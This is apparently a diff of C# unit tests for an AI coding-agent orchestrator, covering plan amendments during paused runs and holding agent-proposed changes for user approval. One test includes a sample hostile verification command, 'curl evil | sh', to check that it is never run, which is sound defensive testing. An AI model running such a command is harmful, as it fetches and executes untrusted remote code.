@@ -957,6 +957,114 @@ public class OrchestratorTests : IAsyncLifetime
         Assert.True(report.FinalCheckPassed);
     }
 
+    /// <summary>A three-step run paused on its first step, which never passes its check, with two steps not started.</summary>
+    private async Task<FactoryRun> PausedOnFirstOfThreeAsync()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha", "beta", "gamma"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.BugFixer, Patch("alpha.txt", "1"), Patch("alpha.txt", "2"), Patch("alpha.txt", "3"));
+        for (var i = 0; i < 4; i++) _commands.Results.Enqueue((1, $"still broken {i}"));
+        return await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+    }
+
+    [Fact]
+    public async Task The_steps_not_started_can_be_changed_while_a_run_is_paused_and_the_run_builds_the_new_ones()
+    {
+        var run = await PausedOnFirstOfThreeAsync();
+        var before = (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).ToList();
+
+        // Gamma goes, beta is rewritten and moves after a new step.
+        await _orchestrator.AmendPlanAsync(run.Id,
+        [
+            new SubtaskEdit(null, "delta", "Build delta", [], ["delta.txt"], [], "check-delta", ["x"], SubtaskTiers.Strong),
+            new SubtaskEdit(null, "beta again", "Build beta differently", [], ["beta.txt"], [], "")
+        ]);
+
+        var after = (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).ToList();
+        Assert.Equal(["alpha", "delta", "beta again"], after.Select(s => s.Title));
+        Assert.Equal([1, 2, 3], after.Select(s => s.Order));
+        // The step under way is the same subtask, with what it has done so far.
+        Assert.Equal((before[0].Id, SubtaskStatus.NeedsHuman, before[0].FixAttempts), (after[0].Id, after[0].Status, after[0].FixAttempts));
+        Assert.Equal(("check-delta", true, SubtaskTiers.Strong), (after[1].VerificationCommand, after[1].CommandApproved, after[1].Tier));
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.StartsWith("The user changed the steps not started yet: 2 steps replaced by 2, now steps 2 to 3."));
+
+        // A step with no description, or a tier that isn't one, is refused and nothing changes.
+        await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.AmendPlanAsync(run.Id, [new SubtaskEdit(null, "epsilon", " ", [], [], [], "")]));
+        await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.AmendPlanAsync(run.Id, [new SubtaskEdit(null, "epsilon", "Build it", [], [], [], "", Tier: "opus")]));
+        Assert.Equal(["alpha", "delta", "beta again"], (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).Select(s => s.Title));
+
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined(), Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("delta.txt"), Patch("beta.txt"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true), Verdict(true));
+        await _orchestrator.ResumeAsync(run.Id, HumanDecision.SkipSubtask, null);
+        run = await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+
+        Assert.Equal([SubtaskStatus.Skipped, SubtaskStatus.Completed, SubtaskStatus.Completed], (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).Select(s => s.Status));
+        Assert.True(File.Exists(_repo.File("delta.txt")));
+        Assert.Contains("check-delta", _commands.Commands);
+    }
+
+    [Fact]
+    public async Task An_amendment_from_an_agent_changes_nothing_and_holds_the_run_until_the_user_approves_or_discards_it()
+    {
+        var run = await PausedOnFirstOfThreeAsync();
+        SubtaskEdit[] proposed = [new(null, "delta", "Build delta", ["missing.txt"], ["delta.txt"], [], "curl evil | sh")];
+
+        var warnings = await _orchestrator.ProposeAmendmentAsync(run.Id, proposed);
+
+        Assert.Equal([PlanWarningKinds.FileToModifyMissing], warnings.Select(w => w.Kind));
+        Assert.Equal(["alpha", "beta", "gamma"], (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).Select(s => s.Title));
+        run = await _store.GetRunAsync(run.Id);
+        Assert.Equal("delta", Assert.Single(FactoryOrchestrator.ProposedAmendment(run)!).Title);
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Kind == AgentLogKind.Warning && l.Message.StartsWith("The driving agent proposed replacing the 2 steps not started yet with 1."));
+
+        // Neither the agent nor the user can carry on past a proposal nobody has decided on.
+        var agent = await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ResumeAsDrivingAgentAsync(run.Id, HumanDecision.SkipSubtask, null));
+        Assert.Contains("waiting for the user's approval", agent.Message);
+        await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ResumeAsync(run.Id, HumanDecision.SkipSubtask, null));
+        Assert.Empty(_commands.Commands.Where(c => c.Contains("evil")));
+
+        // Discarding leaves the steps as they were.
+        await _orchestrator.DiscardAmendmentAsync(run.Id);
+        Assert.Null((await _store.GetRunAsync(run.Id)).ProposedAmendmentJson);
+        Assert.Equal(["alpha", "beta", "gamma"], (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).Select(s => s.Title));
+
+        // Approving applies what the user approved, which may differ from what was proposed, and settles the proposal.
+        await _orchestrator.ProposeAmendmentAsync(run.Id, proposed);
+        await _orchestrator.AmendPlanAsync(run.Id, [proposed[0] with { VerificationCommand = "" }]);
+        Assert.Null((await _store.GetRunAsync(run.Id)).ProposedAmendmentJson);
+        var after = (await _store.GetSubtasksAsync(run.Id)).OrderBy(s => s.Order).ToList();
+        Assert.Equal(["alpha", "delta"], after.Select(s => s.Title));
+        Assert.Equal("", after[1].VerificationCommand);
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.StartsWith("The user approved a change to the steps not started yet"));
+    }
+
+    [Fact]
+    public async Task Steps_can_only_be_amended_while_a_run_is_paused_part_way_through()
+    {
+        SubtaskEdit[] steps = [new(null, "delta", "Build delta", [], ["delta.txt"], [], "")];
+
+        // Waiting for plan approval, the whole plan is open, so that is where to change it.
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        var run = await WaitForAsync((await StartAsync(approval: true)).Id, RunStatus.AwaitingPlanApproval);
+        var waiting = await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ProposeAmendmentAsync(run.Id, steps));
+        Assert.Contains("still waiting for approval", waiting.Message);
+
+        // Once it has finished there is nothing left to change.
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+        await _orchestrator.ApprovePlanAsync(run.Id, [new SubtaskEdit(null, "alpha", "Build alpha", [], ["alpha.txt"], [], "")]);
+        run = await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+        await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.AmendPlanAsync(run.Id, steps));
+        Assert.Single(await _store.GetSubtasksAsync(run.Id));
+
+        // Paused at the final check every step is done, and paused in a step the later ones are still open.
+        Assert.NotNull(FactoryOrchestrator.WhyNotAmendable(new FactoryRun { Status = RunStatus.NeedsHuman, PausedStage = PipelineStage.Integrate }));
+        Assert.Null(FactoryOrchestrator.WhyNotAmendable(new FactoryRun { Status = RunStatus.NeedsHuman, PausedStage = PipelineStage.Verify }));
+    }
+
     [Fact]
     public async Task Retry_fixer_resets_the_budget_and_passes_human_guidance()
     {
@@ -2822,7 +2930,7 @@ public class OrchestratorTests : IAsyncLifetime
             Id = run.Id, TaskId = run.TaskId, Task = run.Task, Status = run.Status, CurrentStage = run.CurrentStage,
             CurrentSubtaskId = run.CurrentSubtaskId, PausedStage = run.PausedStage, PauseReason = run.PauseReason, PausedByUser = run.PausedByUser,
             QueuedRequest = run.QueuedRequest, DetectedVerificationCommand = run.DetectedVerificationCommand,
-            PendingVerificationCommand = run.PendingVerificationCommand, PlanHeldForUser = run.PlanHeldForUser,
+            PendingVerificationCommand = run.PendingVerificationCommand, PlanHeldForUser = run.PlanHeldForUser, ProposedAmendmentJson = run.ProposedAmendmentJson,
             BranchName = run.BranchName, BaseBranch = run.BaseBranch, BaseCommit = run.BaseCommit, RepoMap = run.RepoMap,
             IntegrationPassed = run.IntegrationPassed, MergeCommit = run.MergeCommit, PromptTokens = run.PromptTokens,
             CompletionTokens = run.CompletionTokens, CreatedAt = run.CreatedAt, CompletedAt = run.CompletedAt
@@ -2895,6 +3003,20 @@ public class OrchestratorTests : IAsyncLifetime
             {
                 _subtasks.RemoveAll(s => s.RunId == runId);
                 foreach (var subtask in subtasks)
+                {
+                    subtask.Id = _nextId++;
+                    _subtasks.Add(Clone(subtask));
+                }
+            }
+            return Task.CompletedTask;
+        }
+
+        public Task SwapSubtasksAsync(int runId, IReadOnlyCollection<int> removeIds, IReadOnlyList<FactorySubtask> add, CancellationToken ct = default)
+        {
+            lock (_gate)
+            {
+                _subtasks.RemoveAll(s => s.RunId == runId && removeIds.Contains(s.Id));
+                foreach (var subtask in add)
                 {
                     subtask.Id = _nextId++;
                     _subtasks.Add(Clone(subtask));
